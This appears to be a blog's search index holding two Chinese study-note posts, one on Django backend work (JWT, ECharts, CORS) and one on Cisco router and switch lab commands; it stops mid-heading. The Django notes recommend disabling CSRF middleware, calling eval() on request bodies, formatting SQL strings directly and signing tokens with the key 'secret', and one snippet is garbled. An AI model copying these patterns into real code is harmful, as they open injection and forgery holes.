<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>django学习记录</title>
    <link href="/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="django学习记录"><a href="#django学习记录" class="headerlink" title="django学习记录"></a>django学习记录</h1><h2 id="将现有数据库导入到models-py中"><a href="#将现有数据库导入到models-py中" class="headerlink" title="将现有数据库导入到models.py中"></a>将现有数据库导入到models.py中</h2><pre><code class="shell">python manage.py inspectdb &gt; app/models.py</code></pre><h2 id="js实现定时刷新页面"><a href="#js实现定时刷新页面" class="headerlink" title="js实现定时刷新页面"></a>js实现定时刷新页面</h2><p><a href="https://blog.csdn.net/baidu_38990811/article/details/79172163" target="_blank" rel="noopener">Ajax轮询,Ajax长轮询和websocket(详细使用)</a></p><h2 id="django-shell-调试"><a href="#django-shell-调试" class="headerlink" title="django shell 调试"></a>django shell 调试</h2><p><code>python manage.py shell</code></p><h3 id="python小问题"><a href="#python小问题" class="headerlink" title="python小问题"></a>python小问题</h3><pre><code class="python">orders_num = ordersdate = orders_car_size = orders_price = []</code></pre><img src="2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200322135749091.png" srcset="/img/loading.gif" class="" title="image-20200322135749091"><p>会指向同一个内存地址QAQ</p><p>叫引用赋值</p><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><h3 id="访问不到写好的path"><a href="#访问不到写好的path" class="headerlink" title="访问不到写好的path"></a>访问不到写好的path</h3><pre><code class="python">urlpatterns = [   path(&#39;addUsers/&#39;,views.add_users,name=&#39;add_users&#39;)#api/addUsers]</code></pre><p>检查path(‘path/‘)的斜杠</p><h3 id="Django-用postman进行post请求时：Forbidden-CSRF-cookie-not-set-403"><a href="#Django-用postman进行post请求时：Forbidden-CSRF-cookie-not-set-403" class="headerlink" title="Django 用postman进行post请求时：Forbidden (CSRF cookie not set.) 403"></a>Django 用postman进行post请求时：Forbidden (CSRF cookie not set.) 403</h3><p>注释掉settings.py中的<br>MIDDLEWARE 的 ‘django.middleware.csrf.CsrfViewMiddleware’ </p><p><strong>连接mysql出错</strong></p><p>django.db.utils.OperationalError: (2059) <a href="https://www.jianshu.com/p/e6e6293af2dc" target="_blank" rel="noopener">解决办法</a></p><p><strong>orm查询</strong></p><p><a href="https://www.cnblogs.com/chenxinming-top/p/9506857.html" target="_blank" rel="noopener">https://www.cnblogs.com/chenxinming-top/p/9506857.html</a></p><p><strong>引入bootstrap网站错位</strong></p><p>可能原本就引入了（XD</p><p><strong>异步加载数据</strong></p><p>从mysql读取数据，然后放置到echarts中，效果如图</p><img src="2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200222230043961.png" srcset="/img/loading.gif" class="" title="image-20200222230043961"><p>echarts js</p><pre><code class="js">&lt;div id=&quot;main&quot; style=&quot;width: 790px;height:600px;&quot;&gt;&lt;/div&gt;    &lt;script type=&quot;text/javascript&quot;&gt;      var develop_name_list = {{ develop_name_list|safe }};      var develop_num_list = {{ develop_num_list|safe }};      var myChart = echarts.init(document.getElementById(&#39;main&#39;));      var option = {          grid: {containLabel: true},          xAxis: {name: &#39;数量&#39;},          yAxis: {            type: &#39;category&#39;,            data: develop_name_list            },          series: [              {                  type: &#39;bar&#39;,                  encode: {x: &#39;amount&#39;,y: &#39;product&#39;},                  data: develop_num_list              }          ]      };      myChart.setOption(option);    &lt;/script&gt;</code></pre><p><code></code> 的<code>|safe</code>是必须的，<code>myChart.setOption(option);</code>也是必须的，并且</p><pre><code class="js">yAxis: {            type: &#39;category&#39;,            data: develop_name_list            },</code></pre><p>的type:也一定时category==目前仅知道针对这个图可行==</p><h3 id="使用bootstrap折叠面板之后在里面放置js不渲染"><a href="#使用bootstrap折叠面板之后在里面放置js不渲染" class="headerlink" title="使用bootstrap折叠面板之后在里面放置js不渲染"></a>使用bootstrap折叠面板之后在里面放置js不渲染</h3><p>还没会，无解qaq</p><h3 id="python模糊查询-问题"><a href="#python模糊查询-问题" class="headerlink" title="python模糊查询%问题"></a>python模糊查询%问题</h3><pre><code class="python">sql = &#39;&#39;&#39; SELECT job_Name,description FROM history                WHERE job_Name like &quot;%%{}%%&quot; and job_Name like &quot;%%{}%%&quot;&#39;&#39;&#39;.format(&#39;java&#39;,&#39;后端&#39;)</code></pre><h1 id="django后端开发"><a href="#django后端开发" class="headerlink" title="django后端开发"></a>django后端开发</h1><img src="2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200315130344606.png" srcset="/img/loading.gif" class="" title="image-20200315130344606"><h2 id="接收header或body"><a href="#接收header或body" class="headerlink" title="接收header或body"></a>接收header或body</h2><pre><code class="python"> 获取正则匹配到的数据,num1未位置参数,num2为命名参数,def index(request,num2=None, num1=None): print(num2) # 构造响应数据 reNT&#39;) sp = HttpResponse(&#39;hello world&#39;) # 获取请求头 header = request.META.get(&#39;HTTP_USER_AGE) # 获取地址 path = request.path # 获取GET后面的数据(获取查询字符串数据) para = request.GET() # 获取json数据 json_data = request.body data = eval(request.body.decode()).get(&#39;asd&#39;) data1 = json.loads(request.body).get(&#39;asd&#39;) # 获取表单数据 form_data = request.POST # 获取请求方法 method = request.method # 获取文件 file_obj = request.FILES.get(&#39;image&#39;) return resp</code></pre><h2 id="token和cookie"><a href="#token和cookie" class="headerlink" title="token和cookie"></a>token和cookie</h2><p><a href="https://www.cnblogs.com/moyand/p/9047978.html" target="_blank" rel="noopener">参考资料</a></p><p>大部分api和web应用都用tokens，例如fb，google，推特，gihub</p><p>实现方法是JSON Web Tokens</p><p><a href="https://www.v2ex.com/t/530103" target="_blank" rel="noopener">详细-有案例-Django+JWT 实现 Token 认证</a></p><p><a href="https://juejin.im/post/59749e3751882559274bc80d#heading-11?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">理解JWT（JSON Web Token）认证及python实践</a></p><p><a href="https://juejin.im/post/5df04203e51d45581269a146?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">python接口自动化（二十）–token登录（详解）</a></p><p>可用库：<a href="https://github.com/jpadilla/pyjwt/" target="_blank" rel="noopener">pyjwt</a></p><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><p>所有响应包含三部分，状态码 code、数据 data、消息 msg<br>所有内容都在 data 里，msg 是附加的状态消息</p><p>最后用了简单方法：</p><pre><code class="python">#后端def create_token(users_id,users_name):    payload = {        &quot;iss&quot;: &quot;parkingapp.com&quot;,         &quot;iat&quot;: int(time.time()),         &quot;exp&quot;: int(time.time()) + 86400 * 7,         &quot;users_id&quot;: users_id,         &quot;user_name&quot;: users_name,    }    token = jwt.encode(payload, &#39;secret&#39;, algorithm=&#39;HS256&#39;).decode(&#39;utf-8&#39;)    json_dict_success = {&#39;code&#39;: Httpcode.success,&#39;token&#39;: str(token)}    return JsonResponse(json_dict_success, json_dumps_params={&#39;ensure_ascii&#39;: False})</code></pre><pre><code class="js">&lt;!-- js --&gt;$.ajax({    type: &#39;POST&#39;,    url: &#39;http://localhost:8000&#39;+ add_users_api,    data: {users_name: name,            users_email: email,            users_phone: phone},    success: function(data) {        if (201 === data.code){            alert(&quot;注册成功！&quot;);            localStorage.setItem(&quot;token&quot;, data.token);        } else {            alert(&quot;注册失败，请在检查网络后重试！&quot;);        }     },    error: function(data) {        alert(&quot;注册失败，请在检查网络后重试！&quot;)     },});</code></pre><h3 id="识别token"><a href="#识别token" class="headerlink" title="识别token"></a>识别token</h3><pre><code class="js">var token = localStorage.getItem(&#39;token&#39;);console.log(token);if (null === token){    alert(&quot;请先登录或注册账户&quot;);}$.ajax({    type: &#39;POST&#39;,    url: &#39;http://localhost:8000&#39;+ verify_token,    data: {token: token},success: function(data){    alert(&#39;验证成功&#39;);},error: function(data){    alert(data)},});    </code></pre><pre><code class="python">def verify_token(request):    token = request.POST.get(&#39;token&#39;,0)    result = jwt.decode(token, &#39;secret&#39;, algorithm=&#39;HS256&#39;)</code></pre><h3 id="回传数据"><a href="#回传数据" class="headerlink" title="回传数据"></a>回传数据</h3><p>一开始是</p><img src="2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200322164623665.png" srcset="/img/loading.gif" class="" title="image-20200322164623665"><p>大佬推荐改成如下图，面向对象</p><img src="2020/04/03/django%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%7B603E00A4-D802-FAFC-F8C6-D56187F2F88A%7D.jpg" srcset="/img/loading.gif" class="" title="img"><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="前端post数据到后端，后端接收到请求但无数据传递"><a href="#前端post数据到后端，后端接收到请求但无数据传递" class="headerlink" title="前端post数据到后端，后端接收到请求但无数据传递"></a>前端post数据到后端，后端接收到请求但无数据传递</h3><p>可能因为跨域</p><p>跨越定义 :由于浏览器同源策略，凡是发送请求的url的协议(http和https)、域名（<a href="http://www.example.com,about.example.com）、端口(8010和8020)三者之间任意一个与当前页面地址不同则视为跨域。" target="_blank" rel="noopener">www.example.com,about.example.com）、端口(8010和8020)三者之间任意一个与当前页面地址不同则视为跨域。</a></p><p><a href="https://www.cnblogs.com/randomlee/p/9752705.html" target="_blank" rel="noopener">https://www.cnblogs.com/randomlee/p/9752705.html</a></p><hr><h2 id="职业分类"><a href="#职业分类" class="headerlink" title="职业分类"></a>职业分类</h2><h3 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h3><h3 id="后端开发"><a href="#后端开发" class="headerlink" title="后端开发"></a>后端开发</h3><p>java python php .net c# c++ C vb Delpho perl Ruby Hadoop Node.js 数据挖掘 自然语言处理 搜索算法 精准推荐 全栈 Go ASP Shell 其他</p><h3 id="移动开发"><a href="#移动开发" class="headerlink" title="移动开发"></a>移动开发</h3><p>HTML5 Android IOS WP </p><h3 id="前端开发"><a href="#前端开发" class="headerlink" title="前端开发"></a>前端开发</h3><p>web前端 Flash html5 javascript U3D COCOS2D-X </p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>测试工程师 自动化测试 功能测试 性能测试 测试开发 游戏测试 白盒测试 灰盒测试 手机测试 硬件测试 测试经理</p><h3 id="运维"><a href="#运维" class="headerlink" title="运维"></a>运维</h3><p>运维工程师 运维开发 网络工程师 系统工程师 it支持 idc CDN f5 系统管理员</p><h3 id="DBA"><a href="#DBA" class="headerlink" title="DBA"></a>DBA</h3><p>mysql sqlserver oracle db2 mongoDB ETL</p><p>Hive 数据仓库</p><h3 id="高端职业"><a href="#高端职业" class="headerlink" title="高端职业"></a>高端职业</h3><p>技术经理 技术总监 架构师 cto 运维总监 技术合伙人 项目总监 测试总监 安全专家</p><h3 id="项目管理"><a href="#项目管理" class="headerlink" title="项目管理"></a>项目管理</h3><p>项目经理 项目助理</p><h3 id="硬件开发"><a href="#硬件开发" class="headerlink" title="硬件开发"></a>硬件开发</h3><p>硬件 嵌入式 自动化 单片机 电路设计 驱动开发 系统集成 fpga开发 dsp开发 arm开发 pcb工艺 模具设计 热传导 材料工程师 精益工程师 射频工程师</p><p>企业软件</p><p>实施工程师 售前工程师 售后工程师 BI工程师 </p><h2 id="产品类"><a href="#产品类" class="headerlink" title="产品类"></a>产品类</h2><h3 id="产品经理"><a href="#产品经理" class="headerlink" title="产品经理"></a>产品经理</h3><p>产品经理 页面产品经理 移动产品经理 产品助理 数据产品经理 电商产品经理 游戏策划 产品实习生</p><h3 id="产品设计师"><a href="#产品设计师" class="headerlink" title="产品设计师"></a>产品设计师</h3><p>网页产品设计 无线产品设计师</p><h3 id="高端职位"><a href="#高端职位" class="headerlink" title="高端职位"></a>高端职位</h3><p>产品部经理 产品总监</p><h2 id="设计类"><a href="#设计类" class="headerlink" title="设计类"></a>设计类</h2><h2 id="运营类"><a href="#运营类" class="headerlink" title="运营类"></a>运营类</h2><h2 id="市场"><a href="#市场" class="headerlink" title="市场"></a>市场</h2><blockquote><p>来源：<a href="http://www.360doc.com/content/17/0520/09/43284313_655479904.shtml" target="_blank" rel="noopener">http://www.360doc.com/content/17/0520/09/43284313_655479904.shtml</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>cisco课程代码记录</title>
    <link href="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="cisco课程代码记录"><a href="#cisco课程代码记录" class="headerlink" title="cisco课程代码记录"></a>cisco课程代码记录</h1><p><strong>不记肯定会忘记QAQ,只敲简写然后敲tab也是可以的</strong></p><pre><code>enableconfigure terminalhostname R1</code></pre><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><pre><code>enable secret classline console 0 #线路密码(config-line)password cisco(config-line)login(config-line)exitline vty 0 4 #加密密码设置(config-line)password class(config-line)login(config-line)exitservice password-encrytion</code></pre><h2 id="标语"><a href="#标语" class="headerlink" title="标语"></a>标语</h2><pre><code>banner motd $ ($是截止符号)banner motd $ Authorized Access Only! $</code></pre><h2 id="保存配置"><a href="#保存配置" class="headerlink" title="保存配置"></a>保存配置</h2><pre><code>copy running-config startup-config</code></pre><h2 id="端口设置"><a href="#端口设置" class="headerlink" title="端口设置"></a>端口设置</h2><pre><code>interface f 0/0(config-if)description Link to Lan 1(config-if)ip address 192.168.10.1 255.255.255.0 (config-if)ipv6 address 2001:db8:acad:1::1/64 #IPV6(config-if)no shutdown(config-if)exit#Serial口 作为DCE 要附加上(config-if)clock rate 128000#Loopback环回接口interface loopback 0(config-if)ip address 10.0.0.1 255.255.255.0(config-if)exit</code></pre><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><pre><code>show ip interface briefshow ip ipv6 briefshow ip route</code></pre><h2 id="历史记录"><a href="#历史记录" class="headerlink" title="历史记录"></a>历史记录</h2><pre><code>terminal histroy size 200show history</code></pre><blockquote><p>IPv6 地址解析不使用 ARP 进程，而是使用 ICMPv6 邻居请求和邻居通告消息。IPv6 到 MAC 地址的映射保存在一个类似于 ARP 缓存的表中，称为邻居缓存。</p><p>代码字母 D 用于标识通过 EIGRP 获知的路由。</p><p>“最后选用网关”是另一台路由器的ip地址</p><p>默认静态路由用作最后选用网关</p><p><strong>S 10.2.0.0 [1/0] via 172.16.2.2</strong> 中，方括号内的数字分别表示管理距离和度量。</p><p>ROM 包含在硬件模块上执行的诊断操作</p><p>默认静态路由的 IPv6 地址和前缀为 ::/0。这表示地址中的所有零和前缀长度零</p></blockquote><h2 id="使用rip"><a href="#使用rip" class="headerlink" title="使用rip"></a>使用rip</h2><pre><code>router ripnetwork 网段</code></pre><h2 id="access-list"><a href="#access-list" class="headerlink" title="access-list"></a>access-list</h2><p>禁止访问</p><pre><code>(config)#access-list 1 deny host 24.17.2.18(config)#interface f0/0(config-if)#ip access-group 1 in</code></pre><pre><code>(config)#access-list 1 permit any</code></pre><p>permit anything from the subnet 24.17.2.0. Access-list 102 permit IP 24.17.2.0 0.0.0.15 any log</p><pre><code>Router1(config)#access-list 102 permit ip 24.17.2.0 0.0.0.15 any log</code></pre><p>allow telnet from 24.17.2.16</p><pre><code>(config)#access-list 101 permit tcp 24.17.2.16 0.0.0.15 any eq telnet</code></pre><h2 id="1-1-3-5"><a href="#1-1-3-5" class="headerlink" title="1.1.3.5"></a>1.1.3.5</h2><p>R1</p><pre><code>ciscoenableclassconfig tinterf g0/0ip add 172.16.20.1 255.255.255.128no shutdownexitinterf g0/1ip add 172.16.20.129 255.255.128no shutdown exit</code></pre><p>R2</p><pre><code>ciscoenableclassconfig tinterf g0/0ipv6 add 2001:DB8:C0DE:12::1/64ipv6 address FE80::2 link-localno shutdowninterf g0/1ipv6 add 2001:DB8:C0DE:13::1/64ipv6 address FE80::2 link-localno shutdownex</code></pre><p>测试</p><pre><code>ping 172.16.20.1ping 172.16.20.129ping 64.100.1.10ping 2001:DB8:C0DE:12::1ping 2001:DB8:C0DE:13::1ping 2001:DB8:100:1::A</code></pre><h2 id="1-1-4-5"><a href="#1-1-4-5" class="headerlink" title="1.1.4.5"></a>1.1.4.5</h2><p>RTA</p><pre><code>enable secret classline console 0password ciscologinexitline vty 0password classloginexitservice password-encrytioninterf g0/0 ip add 10.10.10.1 255.255.255.0des pc1no shutdownexinterf g0/1ip add 10.10.20.1 255.255.255.0dec pc2no shutdownexcopy running-config startup-config</code></pre><p>SW1</p><pre><code>int vlan1ip add 10.10.10.2 255.255.255.0no shutdownexip default-gateway 10.10.10.1copy running-config startup-config</code></pre><p>SW2</p><pre><code>int vlan1ip add 10.10.20.2 255.255.255.0no shutdownexip default-gateway 10.10.20.1</code></pre><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200225132814418.png" srcset="/img/loading.gif" class="" title="image-20200225132814418"><h2 id="1-3-2-5"><a href="#1-3-2-5" class="headerlink" title="1.3.2.5"></a>1.3.2.5</h2><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227092952674.png" srcset="/img/loading.gif" class="" title="image-20200227092952674"><p>PC1可ping通PC2和PC3</p><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227093406101.png" srcset="/img/loading.gif" class="" title="image-20200227093406101"><p>PC3可ping通PC4</p><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227093322437.png" srcset="/img/loading.gif" class="" title="image-20200227093322437"><p>show ip route static 查看静态路由转发</p><p>v4可通，v6不同</p><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227100354728.png" srcset="/img/loading.gif" class="" title="image-20200227100354728"><p>手动控制出口端口后又可通，并且查看路由表之后，发现没有FE的，都是2001的，说明是路由设置的问题</p><hr><h2 id="lab1-amp-2-27笔记"><a href="#lab1-amp-2-27笔记" class="headerlink" title="lab1&amp;2.27笔记"></a>lab1&amp;2.27笔记</h2><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227082933206.png" srcset="/img/loading.gif" class="" title="image-20200227082933206"><p>点这里关机，然后拖入模块</p><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/IAEW4JL%60HJEWNF6@I%5BUD1T2.png" srcset="/img/loading.gif" class="" title="img"><p>这个模块是有serial口的</p><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227083957606.png" srcset="/img/loading.gif" class="" title="image-20200227083957606"><pre><code>config tno ip domain-lookup</code></pre><blockquote><p>router&gt; 是处于用户模式</p><p>router# 是处于特权模式 在用户界面使用enable启用</p><p>show hosts 显示分配了主机名的ip地址</p><p>设置远程登录</p><p>(config)line vty 0 4#虚拟终端</p><p>(config-line)password 123</p><p>(config-line)login #允许远程登录</p><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200227085924224.png" srcset="/img/loading.gif" class="" title="image-20200227085924224"><p>enable secret 权限更高，可覆盖enable password</p></blockquote><h2 id="lab2"><a href="#lab2" class="headerlink" title="lab2"></a>lab2</h2><pre><code>int s0/1enable cdp no shutexcdp run</code></pre><blockquote><p>端口下 cdp enable</p></blockquote><h2 id="3-3笔记"><a href="#3-3笔记" class="headerlink" title="3/3笔记"></a>3/3笔记</h2><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303101529289.png" srcset="/img/loading.gif" class="" title="image-20200303101529289"><p>浮动静态路由器：</p><ul><li>备份动态路由协议已发现的路由</li><li>相比原动态路由协议，配置的管理距离更长</li></ul><h3 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h3><p>ip route 网段 掩码 下一跳端口ip</p><p>ip route 172.16.1.0 255.255.255.0 172.16.2.2</p><p>ipv6 route 2001:DB8:ACAD:3::/64 2001:DB8:ACAD:4::2</p><h3 id="完全指定静态路由"><a href="#完全指定静态路由" class="headerlink" title="完全指定静态路由"></a>完全指定静态路由</h3><p>ip route 网段 掩码 端口</p><p>R1(config)# ip route 192.168.2.0 255.255.255.0 GigabitEthernet 0/1</p><p>ipv6 route 2001:DB8:ACAD:3::/64 s0/0/0</p><h3 id="默认静态路由"><a href="#默认静态路由" class="headerlink" title="默认静态路由"></a>默认静态路由</h3><p>ip route 0.0.0.0 0.0.0.0 172.168.2.2</p><p>ipv6 route ::/0 2001:DB8:ACAD:4::2</p><h3 id="浮动静态路由"><a href="#浮动静态路由" class="headerlink" title="!!! 浮动静态路由"></a>!!! 浮动静态路由</h3><p>ip route 0.0.0.0 0.0.0.0 172.16.2.2 # 默认静态路由</p><p>ipv6 route ::/0 ipv6_add </p><p>ip route 0.0.0.0 0.0.0.0 10.10.10.2 5 # 管理距离为5</p><p>ipv6 route ::/0 ipv6_add  5</p><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303110803109.png" srcset="/img/loading.gif" class="" title="image-20200303110803109"><h2 id="2-2-4-4"><a href="#2-2-4-4" class="headerlink" title="2.2.4.4"></a>2.2.4.4</h2><p>R1</p><pre><code>ipv6 unicast-routingipv6 route 2001:DB8:1:2::/64 2001:DB8:1:A001::2ipv6 route 2001:DB8:1:3::/64 2001:DB8:1:A001::2ipv6 route 2001:DB8:1:A002::/64 2001:DB8:1:A001::2</code></pre><p>R2</p><pre><code>ipv6 unicast-routingipv6 route 2001:DB8:1:1::/64 2001:DB8:1:A001::1ipv6 route 2001:DB8:1:3::/64 2001:DB8:1:A002::2</code></pre><p>R3</p><pre><code>ipv6 unicast-routingIPV6 ROUTE ::/0 2001:DB8:1:A002::1</code></pre><h2 id="2-2-5-5"><a href="#2-2-5-5" class="headerlink" title="2.2.5.5"></a>2.2.5.5</h2><p>Edge</p><pre><code>ip route 0.0.0.0 0.0.0.0 s0/0/0ip route 0.0.0.0 0.0.0.0 s0/0/1 5ipv6 route ::/0 s0/0/0ipv6 route ::/0 2001:DB8:A:2::1 5</code></pre><h2 id="2-3-2-3"><a href="#2-3-2-3" class="headerlink" title="2.3.2.3"></a>2.3.2.3</h2><p>R2</p><pre><code>ip route 172.31.1.128 255.255.255.192 172.31.1.198no ip route 172.31.1.128 255.255.255.192 172.31.1.194ip route 172.31.1.0 255.255.255.128 172.31.1.194no ip route 172.31.1.0 255.255.255.128 172.31.1.198</code></pre><p>R3</p><pre><code>ip route 172.31.1.0 255.255.255.128 172.31.1.197</code></pre><h2 id="lab-3-amp-3-10"><a href="#lab-3-amp-3-10" class="headerlink" title="lab 3&amp;3/10"></a>lab 3&amp;3/10</h2><blockquote><p><strong>The Enable Password</strong></p><p>The <em>enable password</em> controls access to privilege mode. This is a VERY important password because in privilege mode you can make configuration changes.</p><p>Krang(config)#enable password frodo</p><p>You can securely encrypt the <em>enable password</em>, by using the enable secret command.</p><p>Krang(config)#enable secret hobbits</p><p>If you have both passwords, the enable secret is the password used.</p></blockquote><p>enable secret password 储存加密的密码，会覆盖enable password frodo</p><hr><p>在端口上启用cdp run，本机路由器show cdp nei 看不见</p><p>而在别的路由上可以看见</p>{% asset_img image-20200310104354035.png image-20200310104354035 %}<p>如右边路由f0/0 只在端口上cdp run。左边端口和路由都cdp run了。左边show cdp nei能看见右边的端口，右边show cdp nei 看不见任何记录</p><h2 id="Lab4"><a href="#Lab4" class="headerlink" title="Lab4"></a>Lab4</h2><pre><code>(config-if)description FastEthernet interface on Router 1# Description: FastEthernet interface on Router 1</code></pre><h2 id="Lab5"><a href="#Lab5" class="headerlink" title="Lab5"></a>Lab5</h2><pre><code># show arpclear arp</code></pre><h2 id="Lab-6"><a href="#Lab-6" class="headerlink" title="Lab 6"></a>Lab 6</h2><pre><code>(config)#ip host California 195.42.36.10show hosts</code></pre><h2 id="Lab-7"><a href="#Lab-7" class="headerlink" title="Lab 7"></a>Lab 7</h2><ul><li>Add RIP routing protocol to the router. What command does this?</li></ul><pre><code>Router2(config)#router ripRouter2(config-router)#</code></pre><ul><li>Add the network(s) that Router 2 is directly connected to. What statements will do this?</li></ul><p><code>Router2(config-router)#network 10.0.0.0</code></p><blockquote><p>查看更新信息使用 debug ip rip 命令时，要用 terminal monitor 命令来接收debug 命令产生的输出。debug ip rip 会把更新信息发送给控制台会话。</p><p>Router#debug ip rip</p><p>RIP protocol debugging is on</p><p>Router#terminal monitor</p><p>接下来就是输出的更新信息，但是它会不断的出来，所以要停止它就得输入 un all 或 undebug all 或 no debug ip rip 即可停止信息的输出</p><p>Router#un all</p><p><a href="http://blog.sina.com.cn/s/blog_62fd2bcb0102voc0.html" target="_blank" rel="noopener">原文</a></p></blockquote><h2 id="3-17-amp-Lab-9"><a href="#3-17-amp-Lab-9" class="headerlink" title="3.17&amp;Lab 9"></a>3.17&amp;Lab 9</h2><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200317102740553.png" srcset="/img/loading.gif" class="" title="image-20200317102740553"><p>路由器连接到server，并且server开启tftp时候</p><pre><code>Tampa# copy running-config tftpAddress or name of remote host []?192.168.1.2储存的文件名：Tampa_config</code></pre><h2 id="lab13"><a href="#lab13" class="headerlink" title="lab13"></a>lab13</h2><p>*<em>交换机之间的线用copper cross-over *</em></p><pre><code>sw1:int f0/3switchport mode accessswitchport access vlan 2int f0/4switchport mode accessswitchport access vlan 3int f0/2switchport mode trunkint f0/1switchport mode trunksw2:int f0/2switchport mode accessswitchport access vlan 2int f0/3switchport mode accessswitchport access vlan 3int f0/1switchport mode trunkrouter:int f0/0.1encapsulation dot1Q 2ip add 192.168.1.254 255.255.255.0no shutint f0/0.2encapsulation dot1Q 3ip add 192.168.2.254 255.255.255.0no shutint f0/0no shut</code></pre><p><strong>VTP</strong></p><p> VLAN 中继协议 (VTP) 的信息。VTP 可简化交换网络中的管理。在一台 VTP 服务器上配置新的 VLAN 时，该 VLAN 将通过域中的所有交换机进行分发。这样可以减少在各处配置相同 VLAN 的需求。VTP 是一种 Cisco 专有协议</p><p><a href="https://www.cisco.com/c/en/us/support/docs/lan-switching/vtp/10558-21.html" target="_blank" rel="noopener">官方解释</a></p><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200319213900208.png" srcset="/img/loading.gif" class="" title="image-20200319213900208"><p><strong>3</strong>. 在switch1合适的配置模式下设置如下命令。</p><pre><code>vtp mode servervtp domain ciscovlan 10vlan 100</code></pre><p> 在switch2合适的配置模式下设置如下命令。</p><pre><code>vtp clientvtp domain cisco</code></pre><h2 id="Lab-14"><a href="#Lab-14" class="headerlink" title="Lab 14"></a>Lab 14</h2><p>EIGRP</p><pre><code>Router(config)#router eigrp ?  &lt;1-65535&gt;  Autonomous system numberR2(config-router)#network 12.1.1.0 0.0.0.255R2(config-router)#network 2.2.0.0 255.255.0.0　（正/反掩码皆可）</code></pre><p>RIP</p><pre><code>Router(config)#router ripversion 2network 120.10.10.0</code></pre><p>OSPF</p><pre><code>Router(config)#router ospf ?  &lt;1-65535&gt;  Process IDnetwork 120.10.10.0 0.0.0.252 area ?  area  Set the OSPF area ID</code></pre><h2 id="lab-15"><a href="#lab-15" class="headerlink" title="lab 15"></a>lab 15</h2><p>NAT,详见<a href="https://blog.csdn.net/besti_white/article/details/81430894" target="_blank" rel="noopener">link</a></p><p>端口多路复用</p><pre><code>Access-list 12 permit 192.168.101.0 0.0.0.255ip nat inside source list 12 interface serial 1/0 overload</code></pre><p>NAT pool</p><pre><code>interface loopback 0ip address 192.168.200.1 255.255.255.0!ip nat pool goodpool 192.168.200.2 192.168.200.101 netmask 255.255.255.0access-list 10 permit 192.168.101.0 0.0.0.255ip nat inside source list 10 pool goodpool</code></pre><h2 id="Lab-16"><a href="#Lab-16" class="headerlink" title="Lab 16"></a>Lab 16</h2><pre><code>interface fastethernet 0/11switchport mode trunkinterface fastethernet 0/11switchport mode dynamic desirable</code></pre><h2 id="3-26"><a href="#3-26" class="headerlink" title="3/26"></a>3/26</h2><img src="2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200326091535593.png" srcset="/img/loading.gif" class="" title="image-20200326091535593"><h2 id="3-31"><a href="#3-31" class="headerlink" title="3/31"></a>3/31</h2><h3 id="RIPv2自动汇总"><a href="#RIPv2自动汇总" class="headerlink" title="RIPv2自动汇总"></a>RIPv2自动汇总</h3><p>使用 <strong>no auto-summary</strong> 路由器配置模式命令，修改默认 RIPv2 自动汇总行为。当使用 RIPv1 时，此命令无效。当已禁用自动汇总时，RIPv2 不会再将网络汇总到其在边界路由器上的有类地址。</p><h3 id="配置被动接口"><a href="#配置被动接口" class="headerlink" 